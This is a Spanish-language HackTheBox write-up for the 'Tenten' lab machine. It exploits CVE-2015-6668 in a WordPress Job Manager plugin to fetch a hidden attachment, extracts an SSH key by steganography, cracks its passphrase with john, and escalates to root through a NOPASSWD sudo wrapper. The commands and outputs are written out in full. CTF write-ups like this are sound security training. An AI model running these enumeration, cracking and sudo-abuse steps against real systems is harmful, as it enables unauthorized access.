---
layout: post
render_with_liquid: false
title: "HTB Writeup: Tenten"
date: 2026-05-21
category: writeups
tags: [htb, linux, medium, wordpress, job-manager, cve-2015-6668, idor, steganography, steghide, ssh-key-cracking, sudo]
platform: HackTheBox
os: Linux
difficulty: Medium
has_exploits: true
exploits_url: /writeups/tenten/exploit/
resumen: "WordPress con el plugin Job Manager vulnerable a CVE-2015-6668: enumeración de IDs de oferta para localizar una oferta oculta y su adjunto accesible por ruta predecible en /wp-content/uploads/. Esteganografía con steghide para extraer una clave SSH del JPG, crackeo de la passphrase con john y acceso como takis. Escalada a root vía sudo sobre un wrapper /bin/fuckin."
permalink: /writeups/tenten/
---

| Propiedad  | Valor      |
| :--------- | :--------- |
| Plataforma | HackTheBox |
| OS         | Linux      |
| Dificultad | Medium     |
| Autor      | Ghostvyle  |

### Temas Tratados

- **Reconocimiento:** Nmap, `http-enum`, WPScan
- **Explotación:** CVE-2015-6668 (Job Manager) — enumeración de IDs de oferta + acceso a adjunto por ruta predecible en `/wp-content/uploads/`
- **Esteganografía:** `steghide`/`stegseek` para extraer `id_rsa` de un JPG; crackeo de la passphrase con `ssh2john` + `john`
- **Escalada:** `sudo (ALL) NOPASSWD: /bin/fuckin` (wrapper que ejecuta argumentos arbitrarios)

## Sinopsis

Máquina Linux con un **WordPress** que monta un portal de empleo usando el plugin **Job Manager**. El plugin es vulnerable a **CVE-2015-6668**: los CVs subidos a través del formulario de aplicación se almacenan en `/wp-content/uploads/<año>/<mes>/` con un nombre **predecible y sin control de acceso**, y los IDs de las ofertas son enumerables. Iterando los IDs encontramos una oferta oculta — **HackerAccessGranted** — cuyo adjunto, `HackerAccessGranted.jpg`, es accesible directamente.

La imagen lleva una clave SSH escondida con **steghide** (sin passphrase de extracción). Extraemos `id_rsa`, que está cifrada con AES-128-CBC; `ssh2john` + `john` recuperan la passphrase (`superpassword`) y entramos por SSH como **takis**.

La escalada: `sudo -l` muestra que `takis` puede ejecutar `/bin/fuckin` como root sin contraseña. Ese binario es un wrapper que ejecuta lo que se le pasa, así que `sudo /bin/fuckin /bin/bash` nos da una shell de **root**.

---

## Reconocimiento

### Escaneo de puertos

```bash
sudo nmap -p- --open -sS --min-rate 5000 -vvv -n -Pn 10.129.43.120 -oG allPorts
```

![Descubrimiento de puertos abiertos con nmap](/writeups/tenten/assets/01_nmap_all_ports.png)

| Puerto    | Servicio | Versión                          |
| :-------- | :------- | :------------------------------- |
| 22/tcp    | SSH      | OpenSSH 7.2p2 Ubuntu 4ubuntu2.1  |
| 80/tcp    | HTTP     | Apache httpd 2.4.18 (Ubuntu)     |

```bash
nmap -sCV -p22,80 10.129.43.120 -oN targeted
```

![Detección de servicio y versión con nmap -sCV](/writeups/tenten/assets/02_nmap_service_version.png)

El servidor redirige a `http://tenten.htb/`. Lo añadimos a `/etc/hosts`:

```bash
echo "10.129.43.120 tenten.htb" | sudo tee -a /etc/hosts
```

### Enumeración WordPress

Un `http-enum` rápido confirma que estamos ante una instalación WordPress:

```bash
nmap -p80 --script http-enum tenten.htb
```

![http-enum revela rutas típicas de WordPress](/writeups/tenten/assets/03_nmap_http_enum.png)

![WPScan en marcha sobre tenten.htb](/writeups/tenten/assets/04_wpscan.png)

Lanzamos **WPScan** con detección agresiva de plugins y enumeración de usuarios:

```bash
wpscan --url http://tenten.htb -e ap,u --plugins-detection aggressive --api-token <TOKEN>
```

![WPScan detecta el plugin job-manager](/writeups/tenten/assets/05_wpscan_jobmanager.png)

WPScan identifica el plugin **`job-manager`**:

![WPScan enumera el usuario takis](/writeups/tenten/assets/06_wpscan_user_takis.png)


Y un usuario:

![searchsploit muestra exploits de Job Manager](/writeups/tenten/assets/07_searchsploit_jobmanager.png)

```
[+] takis
 | Confirmed By: Rss Generator, Wp Json Api, Author Id Brute Forcing, Login Error Messages
```

Buscamos exploits para el plugin:

```bash
searchsploit job manager
```



Aparecen XSS (irrelevantes aquí), pero la vulnerabilidad clave de este plugin es **CVE-2015-6668** — *Sensitive Information Disclosure*: los archivos de CV adjuntos a las ofertas se guardan en una ruta predecible bajo `/wp-content/uploads/` y son accesibles sin autenticación.

---

## Explotación

### CVE-2015-6668 — Enumeración de ofertas y acceso al adjunto

El portal muestra una oferta de empleo ("Pen Tester"):

![Listado de ofertas — Pen Tester](/writeups/tenten/assets/08_job_listing.png)

El formulario de aplicación (`/index.php/jobs/apply/<ID>/`) incluye un campo **Upload your CV**:

![Formulario de aplicación con subida de CV](/writeups/tenten/assets/09_apply_form_cv.png)

El detalle de CVE-2015-6668 es que **los IDs de oferta son enumerables** y algunas ofertas están **ocultas** del listado público. Iterando los IDs encontramos una oferta que no aparece en el portal — el ID `13`:

```
http://tenten.htb/index.php/jobs/apply/13/
```

![Oferta oculta: HackerAccessGranted (apply/13)](/writeups/tenten/assets/10_hidden_job_hackeraccess.png)

La oferta se llama **HackerAccessGranted**. El plugin guarda el adjunto asociado en `/wp-content/uploads/<año>/<mes>/<nombre>` sin proteger el directorio. El nombre del fichero coincide con el título de la oferta, así que probamos:

```bash
wget http://tenten.htb/wp-content/uploads/2017/04/HackerAccessGranted.jpg
```

![Descarga de HackerAccessGranted.jpg](/writeups/tenten/assets/11_wget_hackeraccess.png)

La imagen es un meme de "ACCESS GRANTED" — clara invitación a buscar datos ocultos en ella:

![HackerAccessGranted.jpg](/writeups/tenten/assets/12_hackeraccess_image.png)

> **CVE-2015-6668 en una frase**: el plugin Job Manager (≤ 0.7.25) almacena los CVs subidos en una ubicación predecible y públicamente accesible. Combinado con la enumeración de IDs de oferta, permite recuperar adjuntos privados sin autenticación.

### Esteganografía — extrayendo la clave SSH

Primero, metadatos con `exiftool`:

```bash
exiftool HackerAccessGranted.jpg
```

![Metadatos del JPG con exiftool](/writeups/tenten/assets/13_exiftool.png)

Comprobamos si hay datos embebidos con `steghide`:

```bash
steghide info HackerAccessGranted.jpg
```

![steghide info revela un id_rsa embebido](/writeups/tenten/assets/14_steghide_info.png)

```
"HackerAccessGranted.jpg":
  formato: jpeg
  capacidad: 15,2 KB
¿Intentar informarse sobre los datos adjuntos? (s/n) s
  archivo adjunto "id_rsa":
    tamaño: 1,7 KB
    encriptado: rijndael-128, cbc
    compactado: si
```

Hay un fichero **`id_rsa`** dentro. Lo extraemos con `stegseek`, que prueba passphrases de un diccionario (y la cadena vacía):

```bash
stegseek HackerAccessGranted.jpg /usr/share/wordlists/rockyou.txt
```

![stegseek extrae id_rsa con passphrase vacía](/writeups/tenten/assets/15_stegseek_extract.png)

```
[i] Found passphrase: ""
[i] Original filename: "id_rsa".
[i] Extracting to "HackerAccessGranted.jpg.out".
```

La passphrase de **steghide** era vacía. Obtenemos la clave privada:

![Clave privada id_rsa extraída](/writeups/tenten/assets/16_id_rsa.png)

```
-----BEGIN RSA PRIVATE KEY-----
Proc-Type: 4,ENCRYPTED
DEK-Info: AES-128-CBC,7265FC656C429769E4C1EEFC618E660C
...
```

> **Dos capas de cifrado**: una es la de steghide (vacía, ya superada). La otra es la de la propia clave SSH (`Proc-Type: 4,ENCRYPTED`), que requiere una **passphrase** para usarse. Esa segunda capa hay que crackearla.

### Crackeo de la passphrase del id_rsa

```bash
ssh2john id_rsa > hash.txt
john hash.txt --wordlist=/usr/share/wordlists/rockyou.txt
```

![john recupera la passphrase superpassword](/writeups/tenten/assets/17_john_crack.png)

```
superpassword    (id_rsa)
```

### Acceso por SSH como takis

```bash
chmod 600 id_rsa
ssh -i id_rsa takis@10.129.43.120
# Enter passphrase for key 'id_rsa': superpassword
```

![Acceso SSH como takis](/writeups/tenten/assets/18_ssh_takis.png)

Estamos como **takis** (Ubuntu 16.04). La flag de usuario está en `/home/takis/user.txt`.

---

## Escalada de privilegios — takis → root

```bash
sudo -l
```

![sudo -l muestra NOPASSWD sobre /bin/fuckin](/writeups/tenten/assets/19_sudo_l.png)

```
User takis may run the following commands on tenten:
    (ALL : ALL) ALL
    (ALL) NOPASSWD: /bin/fuckin
```

`/bin/fuckin` es un wrapper custom que ejecuta lo que se le pasa como argumento (equivale a `exec "$@"`). Al estar listado en `sudoers` como `NOPASSWD` para `root`, cualquier comando que le pasemos correrá como root:

```bash
sudo /bin/fuckin /bin/bash
```

![sudo /bin/fuckin /bin/bash → shell de root y root.txt](/writeups/tenten/assets/20_root_flag.png)

```
root@tenten:~# cat /root/root.txt
5cf22cb4ee8757a2d083ace272ef1638
```

Somos **root** en Tenten.

---

> **Disclaimer**: Este contenido es exclusivamente para investigación y formación en ciberseguridad. Solo debe aplicarse en entornos autorizados y controlados.
